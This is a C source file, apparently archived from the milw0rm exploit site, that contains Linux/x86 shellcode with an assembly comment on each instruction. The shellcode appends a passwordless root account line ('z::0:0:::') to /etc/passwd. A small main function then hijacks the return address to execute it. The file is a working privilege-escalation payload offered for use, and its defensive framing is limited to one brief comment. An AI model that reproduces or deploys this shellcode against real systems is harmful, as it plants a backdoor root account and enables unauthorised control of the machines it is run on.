/*
 *  Linux/x86
 *
 *  Appends the line "z::0:0:::\n" to /etc/passwd.
 *  (quite old, could be optimized further)
 */
#include <stdio.h>

char c0de[] =
/* main: */
"\xeb\x29"                           /* jmp callz                */
/* start: */
"\x5e"                               /* popl %esi                */
"\x29\xc0"                           /* subl %eax, %eax          */
"\x88\x46\x0b"                       /* movb %al, 0x0b(%esi)     */
"\x89\xf3"                           /* movl %esi, %ebx          */
"\x66\xb9\x01\x04"                   /* movw $0x401, %cx         */
"\x66\xba\xb6\x01"                   /* movw $0x1b6, %dx         */
"\xb0\x05"                           /* movb $0x05, %al          */
"\xcd\x80"                           /* int $0x80                */
"\x93"                               /* xchgl %eax, %ebx         */
"\x29\xc0"                           /* subl %eax, %eax          */
"\x29\xd2"                           /* subl %edx, %edx          */
"\xb0\x04"                           /* movb $0x04, %al          */
"\x89\xf1"                           /* movl %esi, %ecx          */
"\x80\xc1\x0c"                       /* addb $0x0c, %cl          */
"\xb2\x0a"                           /* movb $0x0a, %dl          */
"\xcd\x80"                           /* int $0x80                */
"\x29\xc0"                           /* subl %eax, %eax          */
"\x40"                               /* incl %eax                */
"\xcd\x80"                           /* int $0x80                */
/* callz: */
"\xe8\xd2\xff\xff\xff"               /* call start               */
/* DATA */
"/etc/passwd"
"\xff"
"z::0:0:::\n";

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(c0de));
        (*ret) = (int)c0de;
}

// milw0rm.com [2000-08-07]